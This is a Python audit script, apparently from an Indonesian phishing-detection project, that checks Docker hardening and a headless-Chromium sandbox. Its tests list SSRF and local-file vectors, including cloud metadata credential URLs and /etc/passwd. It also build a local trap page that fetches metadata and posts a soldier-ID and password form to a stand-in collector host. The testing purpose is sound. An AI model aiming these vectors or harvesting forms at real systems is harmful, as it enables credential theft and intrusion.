"""
VisiKartika Shield — Phase 5 (Zuan / Person A) Container Footprint & Chromium Isolation Audit.

Memverifikasi seluruh deliverable Phase 5 Zuan pada `README.md`:
  1. Optimasi Docker Build Context & Multi-Stage Image Footprint (`.dockerignore` & `Dockerfile`):
     - Memastikan `.env`, `.venv/`, `frontend-soc/node_modules/`, `openwa-gateway/`, dan `storage/dataset/`
       tidak bocor ke image Docker (konteks build ringan ~30 MB, bukan >500 MB).
     - Memastikan profil `TORCH_PROFILE=none|cpu|gpu` menggunakan wheel minimal CPU/CUDA 12.4,
       Playwright hanya menginstal Chromium (hemat >1 GB dibanding image multi-browser),
       serta memakai `tini` (PID-1 reaper), `MALLOC_ARENA_MAX=2`, dan user non-root `pwuser` (UID 10001).
  2. Isolasi Ketat Dependensi & Runtime Headless Chromium (`app/sandbox/browser.py`):
     - Pembatasan V8 Heap (`--max-old-space-size=256`), renderer limit (`2`), `service_workers="block"`,
       `accept_downloads=False`, `permissions=[]`.
     - Pemblokiran SSRF / DNS-rebinding & skema berbahaya di dalam sub-request Chromium
       (`file://`, `chrome://`, `169.254.169.254` cloud metadata, `127.0.0.1`, `10.x`, `192.168.x`).
     - Uji langsung (live Playwright) terhadap halaman adversarial yang mencoba `alert()` trap,
       `window.open()` popup, `window.print()`, `file://`, dan SSRF metadata `169.254.169.254`.

Cara menjalankan (dari folder `backend-engine`):
    python scripts/verify_phase5.py
"""

from __future__ import annotations

import asyncio
import fnmatch
import functools
import http.server
import os
import socketserver
import sys
import tempfile
import threading
import time
from pathlib import Path

BACKEND_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BACKEND_ROOT))

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

os.environ.setdefault("VK_OFFLINE_BENCHMARK", "1")

from app.main import health_check  # noqa: E402
from app.sandbox.browser import (  # noqa: E402
    _build_chromium_args,
    get_sandbox_isolation_profile,
    is_subrequest_allowed,
)
from app.scanner_service import scanner  # noqa: E402


def _estimate_docker_context_mb(root: Path) -> tuple[float, int, list[str]]:
    """Simulate `.dockerignore` filtering with directory pruning and compute build context size."""
    ignore_file = root / ".dockerignore"
    raw_rules = [
        ln.strip()
        for ln in ignore_file.read_text(encoding="utf-8").splitlines()
        if ln.strip() and not ln.strip().startswith("#")
    ]

    def is_ignored(rel_posix: str) -> bool:
        ignored = False
        parts = rel_posix.split("/")
        for rule in raw_rules:
            negate = rule.startswith("!")
            pat = rule[1:] if negate else rule
            pat_clean = pat.rstrip("/")
            matched = False
            if pat.startswith("**/"):
                sub = pat[3:].rstrip("/")
                matched = any(fnmatch.fnmatch(p, sub) for p in parts)
            elif "/" not in pat_clean:
                matched = fnmatch.fnmatch(parts[-1], pat_clean) or fnmatch.fnmatch(parts[0], pat_clean)
            else:
                matched = fnmatch.fnmatch(rel_posix, pat_clean) or rel_posix.startswith(pat_clean + "/")
            if matched:
                ignored = not negate
        return ignored

    # Directories that have no `!` negation overrides inside them can be pruned immediately
    prunable_top_dirs = {
        ".git",
        ".venv",
        "venv",
        "env",
        "frontend-soc",
        "openwa-gateway",
        "node_modules",
        "__pycache__",
        ".pytest_cache",
        ".vscode",
        "tests",
        "postman",
        "scripts",
        "supabase",
    }

    total_bytes = 0
    included_files: list[str] = []
    for cur_root, dirnames, filenames in os.walk(root):
        cur_p = Path(cur_root)
        rel_dir = cur_p.relative_to(root).as_posix()
        dirnames[:] = [
            d
            for d in dirnames
            if d not in prunable_top_dirs
            and not (rel_dir == "storage" and d in ("dataset", "synthetic_yolo"))
        ]
        for fname in filenames:
            f_path = cur_p / fname
            rel = f_path.relative_to(root).as_posix()
            if is_ignored(rel):
                continue
            total_bytes += f_path.stat().st_size
            included_files.append(rel)

    return total_bytes / (1024 * 1024), len(included_files), included_files


class _SilentHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format: str, *args: object) -> None:
        pass


def audit_static_container_and_ssrf() -> None:
    print("=" * 78)
    print("PHASE 5 (ZUAN) AUDIT: DOCKER MINIMAL FOOTPRINT & CHROMIUM SANDBOX ISOLATION")
    print("=" * 78)

    # 1. Audit .dockerignore & build context footprint
    ctx_mb, file_count, included = _estimate_docker_context_mb(BACKEND_ROOT)
    print("\n[1] AUDIT BUILD CONTEXT DOCKER (.dockerignore):")
    print(f"    • File terkirim ke Docker daemon : {file_count} file ({ctx_mb:.2f} MB)")
    assert ".env" not in included, "FATAL: .env tidak boleh masuk ke Docker build context!"
    assert not any(p.startswith("frontend-soc/") for p in included), "frontend-soc/ harus di-ignore!"
    assert not any("node_modules/" in p for p in included), "node_modules/ harus di-ignore!"
    assert not any(p.startswith(".venv/") for p in included), ".venv/ harus di-ignore!"
    assert not any(p.startswith("storage/dataset/") for p in included), "storage/dataset/ harus di-ignore!"
    assert ctx_mb < 45.0, f"Build context terlalu besar ({ctx_mb:.2f} MB > 45 MB)!"
    print("    [PASS] Bebas .env, .venv, node_modules, & frontend-soc (< 45 MB minimal context)!")

    # 2. Audit Dockerfile & docker-compose.yml directives
    dockerfile_txt = (BACKEND_ROOT / "Dockerfile").read_text(encoding="utf-8")
    compose_txt = (BACKEND_ROOT / "docker-compose.yml").read_text(encoding="utf-8")
    print("\n[2] AUDIT DOCKERFILE MULTI-STAGE (CPU/GPU) & HARDENED COMPOSE:")
    required_docker_tokens = [
        ("Multi-stage slim base", "FROM python:3.12-slim-bookworm AS builder"),
        ("PyTorch CPU minimal index", "https://download.pytorch.org/whl/cpu"),
        ("PyTorch GPU CUDA 12.4 index", "https://download.pytorch.org/whl/cu124"),
        ("Chromium-only Playwright install", "playwright install --with-deps chromium"),
        ("PID-1 zombie reaper (tini)", 'ENTRYPOINT ["/usr/bin/tini", "--"]'),
        ("Glibc arena memory cap", "MALLOC_ARENA_MAX=2"),
        ("CPU thread contention cap", "OMP_NUM_THREADS=2"),
        ("Unprivileged user pwuser", "USER pwuser"),
        ("Vercel production CORS pre-wired", "https://zero-day-phising-shield.vercel.app"),
    ]
    for label, token in required_docker_tokens:
        assert token in dockerfile_txt, f"Missing '{token}' in Dockerfile"
        print(f"    [OK] Dockerfile -> {label}")

    for label, token in [
        ("Read-only root filesystem", "read_only: true"),
        ("Drop all Linux capabilities", "- ALL"),
        ("No new privileges", "no-new-privileges:true"),
        ("PIDs fork-bomb limit", "pids_limit:"),
        ("Dedicated /dev/shm limit", "shm_size:"),
    ]:
        assert token in compose_txt, f"Missing '{token}' in docker-compose.yml"
        print(f"    [OK] docker-compose.yml -> {label}")

    # 3. Audit Chromium Launch Flags & Zero-Trust Sub-request SSRF Guard
    print("\n[3] AUDIT CHROMIUM ISOLATION FLAGS & ZERO-TRUST SSRF SUB-REQUEST FILTER:")
    c_args = _build_chromium_args()
    profile = get_sandbox_isolation_profile()
    assert "--disable-dev-shm-usage" in c_args
    assert any(a.startswith("--js-flags=--max-old-space-size=") for a in c_args)
    assert "--renderer-process-limit=2" in c_args
    assert "--block-new-web-contents" in c_args

    blocked_vectors = [
        "file:///etc/passwd",
        "file:///C:/Windows/win.ini",
        "chrome://settings",
        "javascript:alert(1)",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://127.0.0.1:8000/api/v1/supabase/seed-portals",
        "http://localhost:2785/api/sessions",
        "http://192.168.1.1/admin",
        "http://10.0.0.12:6379/",
        "http://postgres.internal:5432/",
    ]
    for vec in blocked_vectors:
        assert not is_subrequest_allowed(vec, allow_private_targets=False), f"SSRF vector leaked: {vec}"

    allowed_vectors = [
        "https://tniad.mil.id/assets/logo.png",
        "https://zero-day-phising-shield.vercel.app/sandbox",
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=",
    ]
    for vec in allowed_vectors:
        assert is_subrequest_allowed(vec, allow_private_targets=False), f"Legitimate asset blocked: {vec}"

    print(f"    [PASS] 11/11 vektor SSRF/file/metadata diblokir & profil isolasi aktif: {profile}")


async def audit_live_adversarial_sandbox() -> None:
    print("\n[4] UJI LIVE CHROMIUM SANDBOX TERHADAP HALAMAN ADVERSARIAL (DIALOG/POPUP/SSRF):")
    h = await health_check()
    assert "sandbox_isolation" in h, "/health wajib menyertakan telemetri sandbox_isolation"

    with tempfile.TemporaryDirectory(prefix="vk_p5_adv_") as tmp_str:
        tmp_dir = Path(tmp_str)
        mock_sub = tmp_dir / "mock-targets"
        mock_sub.mkdir(parents=True, exist_ok=True)
        (mock_sub / "adversarial_trap.html").write_text(
            """<!DOCTYPE html>
<html lang="id"><head><meta charset="UTF-8"><title>Adversarial Trap Test</title></head>
<body>
  <h1>Uji Ketahanan Isolasi Chromium VisiKartika</h1>
  <img src="file:///C:/Windows/win.ini" alt="local-file-probe" width="40" height="40">
  <script>
    try { alert('Trap Dialog 1'); } catch (e) {}
    try { window.print(); } catch (e) {}
    try { window.open('https://evil-popup.example.org', '_blank'); } catch (e) {}
    fetch('http://169.254.169.254/latest/meta-data/').catch(() => {});
  </script>
  <form action="https://collector.example.org/post" method="POST">
    <input type="text" name="nrp" placeholder="NRP Prajurit">
    <input type="password" name="sandi" placeholder="Kata Sandi">
  </form>
</body></html>""",
            encoding="utf-8",
        )

        handler = functools.partial(_SilentHandler, directory=str(tmp_dir))
        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), handler)
        server.daemon_threads = True
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()

        try:
            await scanner.warmup()
            t0 = time.perf_counter()
            res = await scanner.capture_and_extract(
                f"http://127.0.0.1:{port}/mock-targets/adversarial_trap.html",
                scan_id="p5_isolation_test",
            )
            dt = time.perf_counter() - t0
            assert res.success is True
            assert dt < 5.0, f"Adversarial page hung the sandbox ({dt:.3f}s >= 5.0s)!"
            print(
                f"    [PASS] Halaman adversarial berhasil diisolasi tanpa hang dalam {dt:.3f}s "
                f"(inputs={len(res.inputs)}, dom_score={res.risk_analysis.dom_anomaly_score})"
            )
        finally:
            server.shutdown()
            server.server_close()
            await scanner.aclose()

    print("\n[OK] SELURUH DELIVERABLE PHASE 5 (ZUAN) LULUS AUDIT 100%!")


if __name__ == "__main__":
    audit_static_container_and_ssrf()
    asyncio.run(audit_live_adversarial_sandbox())
